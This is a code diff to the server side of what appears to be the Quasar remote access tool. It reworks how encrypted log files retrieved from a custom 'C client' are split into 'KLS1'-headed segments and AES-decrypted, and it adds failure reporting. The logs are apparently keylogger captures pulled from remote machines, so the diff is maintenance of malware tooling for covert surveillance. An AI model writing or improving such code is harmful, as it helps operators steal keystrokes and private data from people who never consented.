@@ -171,29 +171,34 @@ namespace Quasar.Server.Messages
                         {
                             var sb = new StringBuilder();
                             int pos = 0;
+                            int decryptedSegments = 0;
                             const byte K = (byte)'K', L = (byte)'L', S = (byte)'S', One = (byte)'1';
-                            while (pos + 4 <= raw.Length)
+                            while (pos + 8 <= raw.Length)
                             {
-                                int segLen;
-                                if (pos + 8 <= raw.Length && raw[pos] == K && raw[pos + 1] == L && raw[pos + 2] == S && raw[pos + 3] == One)
+                                if (!(raw[pos] == K && raw[pos + 1] == L && raw[pos + 2] == S && raw[pos + 3] == One))
                                 {
-                                    pos += 4;
-                                    segLen = raw[pos] | (raw[pos + 1] << 8) | (raw[pos + 2] << 16) | (raw[pos + 3] << 24);
+                                    pos++;
+                                    continue;
                                 }
-                                else
-                                    segLen = raw[pos] | (raw[pos + 1] << 8) | (raw[pos + 2] << 16) | (raw[pos + 3] << 24);
-                                pos += 4;
-                                if (segLen < 48 || segLen > raw.Length || pos + segLen > raw.Length)
-                                    break;
+
+                                int segLen = raw[pos + 4] | (raw[pos + 5] << 8) | (raw[pos + 6] << 16) | (raw[pos + 7] << 24);
+                                if (segLen < 48 || pos + 8 + segLen > raw.Length)
+                                    break; // likely trailing partial segment while file is still being written
+
                                 byte[] segment = new byte[segLen];
-                                Buffer.BlockCopy(raw, pos, segment, 0, segLen);
-                                pos += segLen;
+                                Buffer.BlockCopy(raw, pos + 8, segment, 0, segLen);
+                                pos += 8 + segLen;
                                 sb.Append(Encoding.UTF8.GetString(CClientAes.Decrypt(segment)));
+                                decryptedSegments++;
                             }
-                            if (sb.Length >= 10)
+
+                            if (decryptedSegments > 0 && sb.Length > 0)
                                 content = sb.ToString();
-                            if (content == null && raw.Length >= 48)
+                            else if (content == null && raw.Length >= 48)
+                            {
+                                // Legacy C client blob format (single encrypted payload without segment headers).
                                 content = Encoding.UTF8.GetString(CClientAes.Decrypt(raw));
+                            }
                         }
                     }
                     catch { /* not C client format or corrupt */ }
@@ -212,9 +217,15 @@ namespace Quasar.Server.Messages
                     }
                     if (content != null)
                         File.WriteAllText(transfer.LocalPath, content, Encoding.UTF8);
-                    OnReport(_allTransfers == _completedTransfers
-                        ? "Successfully retrieved all logs"
-                        : GetDownloadProgress(_allTransfers, _completedTransfers));
+                    else
+                        OnReport("Decryption failed for " + Path.GetFileName(transfer.LocalPath));
+
+                    if (content != null)
+                    {
+                        OnReport(_allTransfers == _completedTransfers
+                            ? "Successfully retrieved all logs"
+                            : GetDownloadProgress(_allTransfers, _completedTransfers));
+                    }
                 }
                 catch (Exception)
                 {
